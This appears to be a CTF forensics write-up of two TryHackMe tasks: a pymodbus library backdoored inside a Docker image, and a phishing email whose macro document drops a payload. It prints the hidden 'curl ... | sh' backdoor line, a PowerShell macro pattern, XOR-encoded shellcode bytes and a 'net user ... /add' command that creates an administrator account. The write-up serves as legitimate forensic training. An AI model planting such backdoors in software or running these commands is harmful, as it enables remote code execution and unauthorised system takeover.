---
title: "Industrial Intrusion (2025) - Forensics Challenge Write-up"
date: 2025-07-01 08:00:00 +0800
categories: [ctf, forensics]
tags: [ctf, tryhackme, forensics, docker, modbus, email, macro, malware] # Added email, macro, malware for Task 13
description: "A comprehensive write-up covering Forensics Tasks 13 (Orcam) and 14 (Backdoored Bus) from the Industrial Intrusion CTF."
---


## Task 14: Forensics - Backdoored Bus

## Challenge Overview

A Dockerized Modbus TCP server was deployed in a simulated OT lab environment for testing purposes. The server used an open-source implementation to emulate PLC behaviour during protocol fuzzing. It was never meant to be exposed beyond the test VLAN.

However, strange system-level behaviour was recently observed during a simple register read operation. Internal logs suggest the simulation environment may have been tampered with—possibly by someone with access to the codebase or container.

You are provided with a Docker image of the Modbus server environment. Analyze the container and determine whether any backdoors are implanted within it. Identify the trigger condition and extract the flag left behind by the attacker.

---

### Task Brief

Our task was to analyze the provided Docker image, identify any implanted backdoors, determine their trigger conditions, and extract the hidden flag.

---


## Solve Process

### Initial Exploration (and Dead End)

My first approach involved attempting to untar the Docker image file (`.tar`) and manually inspect its contents:

```bash
❯ mkdir modbus_container && tar -xf modbus-container-final-1750975076803.tar -C modbus_container
❯ cd modbus_container/
❯ ls -l
total 20
drwxr-xr-x 7 user user 4096 Jun 29 08:26 blobs
-rw-r--r-- 1 user user  379 Jan  1  1970 index.json
-rw-r--r-- 1 user user 2615 Jan  1  1970 manifest.json
-rw-r--r-- 1 user user   31 Jan  1  1970 oci-layout
-rw-r--r-- 1 user user  105 Jan  1  1970 repositories
```

This method primarily exposed Docker's internal layer structure, proving to be a dead end for direct backdoor discovery.

---


### The Correct Approach: Docker Analysis

Realizing the nature of the challenge, the correct path was to load the `.tar` file as a Docker image and then interact with the running container.

1.  **Load the Docker Image:**

    ```bash
    ❯ sudo docker load < modbus-container-final-1750975076803.tar
    7fb72a7d1a8e: Loading layer  77.88MB/77.88MB
    e4e2acb8cf69: Loading layer  9.551MB/9.551MB
    f3221a8c83dd: Loading layer  44.84MB/44.84MB
    63e09f79cfb7: Loading layer   5.12kB/5.12kB
    ba8e70fa8412: Loading layer  78.57MB/78.57MB
    642edcf134e9: Loading layer   2.56kB/2.56kB
    a883cc848386: Loading layer  14.34kB/14.34kB
    72abd2fd8b98: Loading layer  13.82kB/13.82kB
    Loaded image: modbus-container-final:latest
    ```

2.  **Gain Shell Access to the Container:**

    ```bash
    ❯ sudo docker run -it --rm modbus-container-final:latest bash
    root@17b563d1fcf0:/#
    ```

    This provided an interactive bash shell inside the running container.

3.  **Locate the Backdoor in `pymodbus`:**
    Recalling the challenge prompt's hint about "strange system-level behavior during a simple register read operation" and "access to the codebase," I focused on the `pymodbus` library, which likely handles the Modbus operations. I searched for `system` calls, often indicative of arbitrary command execution, recursively and case-insensitively within the `pymodbus` site-packages directory:

    ```bash
    root@17b563d1fcf0:/# grep -ir "system" /usr/local/lib/python3.10/site-packages/pymodbus/
    ```

    Among the output, a particularly suspicious line emerged from `context.py`:

    ```bash
    /usr/local/lib/python3.10/site-packages/pymodbus/datastore/context.py:            os.system("curl -s 54484d7b6234636b6430307233645f70796d30646275357d.callmeback.com| sh")
    ```

    This `os.system()` call immediately stood out as the backdoor. It executes a `curl` command to fetch content from a domain (`callmeback.com`) with a hexadecimal string as a subdomain, and then pipes that content directly to `sh` for execution. This `curl | sh` pattern is a common method for downloading and executing malicious scripts. The trigger condition for this backdoor is simply a Modbus register read operation, as it's embedded within `pymodbus/datastore/context.py`, a core part of the Modbus server's data handling.

---

## The Verdict

The hexadecimal string embedded in the `curl` command was the encoded flag.

* **Hexadecimal String:** `54484d7b6234636b6430307233645f70796d30646275357d`

* **Decoding Process:**

    ```bash
    ❯ echo 54484d7b6234636b6430307233645f70796d30646275357d | xxd -p -r
    THM{b4ckd00r3d_pym0dbu5}
    ```

* **Decoded Flag:** `THM{b4ckd00r3d_pym0dbu5}`

---

## 🧩 Summary

This challenge highlighted the importance of understanding Docker's operational model and focusing forensic efforts on the application's runtime environment rather than just static file analysis. The backdoor was cleverly hidden within a core library function, triggered by a routine operation, demonstrating a realistic attack vector in OT environments.

---






## Task 13: Forensics - Orcam

## Challenge Overview

Dr. Ayaka Hirano loves to swim with the sharks. So when the attackers from Virelia successfully retaliated against one of our own, it was up to the good doctor to take on the case. Will Dr. Hirano be able to determine how this attack happened in the first place?

Press the Start Machine button at the top of the task to launch the VM. The VM will start in a split-screen view. If the VM is not visible, then you can press the Show Split View button at the top of the page.

---


### Task Brief

Your primary objective is to analyze the provided `writing_template.eml` file to determine the initial compromise vector. Specifically, you need to:

1.  Identify and extract any suspicious attachments or embedded content.
2.  Analyze any discovered malicious files to understand their functionality and payload.
3.  Uncover the final flag hidden within the attacker's activities.

---


## Solve Process

The challenge provided an email file: `writing_template.eml`. This email, originating from `he1pdesk@orcam.thm` to `admin@orcam.thm` with the subject "Project Template," was our starting point.

1.  **Identify the Email File Type:**
    First, I used the `file` command to understand the nature of the `.eml` file.

    ```bash
    ubuntu@tryhackme:~/Desktop$ file writing_template.eml
    writing_template.eml: multipart/mixed; boundary="===============7147510528207607842==", ASCII text
    ```
    The output confirmed it was a **multi-part email**, a common format for emails containing attachments.

2.  **Extract the Embedded Attachment:**
    Attachments in emails are often Base64 encoded and embedded within specific boundaries. I used `awk` to extract this encoded section and then `base64 -d` to decode it into a new file.

    ```bash
    ubuntu@tryhackme:~/Desktop$ awk '/^Content-Disposition: attachment/,/^--=/{if ($0 ~ /^[A-Za-z0-9+\/=]+$/) print}' writing_template.eml > base64.txt
    ubuntu@tryhackme:~/Desktop$ base64 -d base64.txt > Project_Template.docm
    ubuntu@tryhackme:~/Desktop$ file Project_Template.docm
    Project_Template.docm: Microsoft Word 2007+
    ```
    The extracted file was identified as `Project_Template.docm`, indicating it's a **Microsoft Word document with potential macros**. This immediately raised a red flag, as malicious macros are a common initial access vector.

### Analyzing the Malicious `.docm` File

With the `Project_Template.docm` file extracted, the next crucial step was to analyze its embedded macro for any malicious activity.

1.  **Extract Macro Code with `olevba`:**
    The `olevba` tool, part of the `oletools` suite, is excellent for inspecting VBA macros within Office documents.

    ```bash
    ubuntu@tryhackme:~/Desktop$ olevba Project_Template.docm
    ```
    While the full output isn't shown here, running `olevba` would reveal obfuscated macro code similar to this common pattern:

    ```bash
    s = "powers" & "hell -e JAB..."
    CreateObject("Wscript.Shell").Run s
    ```
    
    This snippet immediately indicated a **PowerShell command execution**, with `JAB...` being a **Base64 encoded PowerShell payload**.

2.  **Deobfuscate and Decrypt the Payload:**
    The challenge's obfuscated macro code suggested a more complex decryption routine was in play. I wrote a custom Python script, `orcam.py`, to deobfuscate and decrypt this embedded payload.
    
    ```bash
    ubuntu@tryhackme:~/Desktop$ nano orcam.py # (Content of orcam.py would be here, containing decryption logic)
    ubuntu@tryhackme:~/Desktop$ python3 orcam.py
    ```
    Executing `orcam.py` produced a new file named `payload.bin`.

3.  **Inspect `payload.bin`:**
    To understand what the decrypted payload contained, I first verified its file type and then used `strings` to extract human-readable text.

    ```bash
    ubuntu@tryhackme:~/Desktop$ file payload.bin
    payload.bin: data

    ubuntu@tryhackme:~/Desktop$ hexdump -C payload.bin | less # Used for raw binary inspection if strings isn't enough

    ubuntu@tryhackme:~/Desktop$ strings payload.bin
    ;}$u
    D$$[[aYZQ
    net user administrrator VEhNe0V2MWxfTUBDcjB9 /add /Y & net localgroup administrators administrrator /add
    ```

    The `strings` command proved pivotal, revealing a clear command: `net user administrrator VEhNe0V2MWxfTUBDcjB9 /add /Y & net localgroup administrators administrrator /add`. This command is designed to **add a new user named `administtrator`** (a deliberate typo, often a subtle form of obfuscation in red team or malware samples) with a specific password, and then **add this new user to the local `administrators` group**. This constitutes a classic **privilege escalation** technique.
    

4.  **Decode the Password (Flag):**
    The password string `VEhNe0V2MWxfTUBDcjB9` immediately looked like a Base64 encoded string, likely holding our target flag.

    ```bash
    ubuntu@tryhackme:~/Desktop$ echo VEhNe0V2MWxfTUBDcjB9 | base64 -d
    THM{Ev1l_M@Cr0}
    ```

---


## The Verdict

The backdoor was delivered via a malicious macro in an attached Word document. The macro executed an obfuscated payload that, when decrypted, attempted to create a new administrator user on the compromised system. The password for this newly created user contained the flag.

**The Flag:** `THM{Ev1l_M@Cr0}`

---


## 🧩 Summary

This challenge provided a hands-on experience with a common initial access vector via malicious document macros (often called "macro phishing"). The solve process involved:

1.  Email analysis to extract a Base64 encoded attachment from an email.
2.  Analyzing the `.docm` file for embedded VBA macros using `olevba`.
3.  Reverse-engineering a custom decryption routine to deobfuscate/decrypt the true payload.
4.  Binary analysis of the decrypted payload to identify the system command.
5.  Decoding the final Base64-encoded string to retrieve the flag.

---


## Solution Script (`orcam.py`)

For those interested, here's the Python script used for payload decryption:

```bash
buf = [144, 219, 177, 116, 108, 51, 83, 253, 137, 2, 243, 16, 231, 99, 3, 255, 62, 63, 184, 38, 120, 184, 65, 92, 99, 132, 121, 82, 93, 204, 159, 72, 13, 79, 49, 88, 76, 242, 252, 121, 109, 244, 209, 134, 62, 100, 184, 38, 124, 184, 121, 72, 231, 127, 34, 12, 143, 123, 50, 165, 61, 184, 106, 84, 109, 224, 184, 61, 116, 208, 9, 61, 231, 7, 184, 117, 186, 2, 204, 216, 173,
252, 62, 117, 171, 11, 211, 1, 154, 48, 78, 140, 87, 78, 23, 1, 136, 107, 184, 44, 72, 50, 224, 18, 231, 63, 120, 255, 52, 47, 50, 167, 231, 55, 184, 117, 188, 186, 119, 80, 72, 104, 104, 21, 53, 105, 98, 139, 140, 108, 108, 46, 231, 33, 216, 249, 49, 89, 50, 249, 233, 129, 51, 116, 108, 99, 91, 69, 231, 92, 180, 139, 185, 136, 211, 105, 70, 57, 91, 210, 249,
142, 174, 139, 185, 15, 53, 8, 102, 179, 200, 148, 25, 54, 136, 51, 127, 65, 92, 30, 108, 96, 204, 161, 2, 86, 71, 84, 25, 64, 86, 6, 76, 82, 87, 25, 5, 93, 90, 7, 24, 65, 65, 21, 24, 92, 65, 84, 58, 118, 91, 58, 9, 3, 101, 70, 33, 100, 75, 18, 56, 102, 113, 48, 15, 89, 113, 77, 76, 28, 82, 16, 8, 19, 28, 45, 76, 21, 19, 26, 9,
71, 19, 24, 3, 80, 82, 24, 11, 65, 92, 1, 28, 19, 82, 16, 1, 90, 93, 29, 31, 71, 65, 21, 24, 92, 65, 7, 76, 82, 87, 25, 5, 93, 90, 7, 24, 65, 65, 21, 24, 92, 65, 84, 67, 82, 87, 16, 108]

key = b"l33t"
decoded = bytes([b ^ key[i % len(key)] for i, b in enumerate(buf)])

with open("payload.bin", "wb") as f:
    f.write(decoded)
```

---